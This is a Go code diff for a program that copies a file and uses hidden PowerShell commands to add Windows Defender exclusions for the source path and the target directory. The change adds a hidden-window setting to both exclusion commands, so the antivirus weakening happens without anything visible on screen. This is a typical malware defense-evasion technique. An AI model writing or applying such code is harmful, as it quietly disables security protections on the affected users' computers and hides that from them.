@@ -6,6 +6,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"syscall"
 )
 
 func copyFile(srcPath, targetPath string) error {
@@ -51,15 +52,20 @@ func defenderExclude(name string) error {
 	}
 
 	var cmd string
+	var execCmd *exec.Cmd
 	args := []string{"-NoProfile", "-NonInteractive", "-Command"}
 
 	cmd = fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -Force`, srcPath)
-	if err := exec.Command("powershell.exe", append(args, cmd)...).Run(); err != nil {
+	execCmd = exec.Command("powershell.exe", append(args, cmd)...)
+	execCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	if err := execCmd.Run(); err != nil {
 		return fmt.Errorf("failed to add exclusion to Windows Defender: %w", err)
 	}
 
 	cmd = fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -Force`, targetDir)
-	if err := exec.Command("powershell.exe", append(args, cmd)...).Run(); err != nil {
+	execCmd = exec.Command("powershell.exe", append(args, cmd)...)
+	execCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	if err := execCmd.Run(); err != nil {
 		return fmt.Errorf("failed to add exclusion to Windows Defender: %w", err)
 	}
 
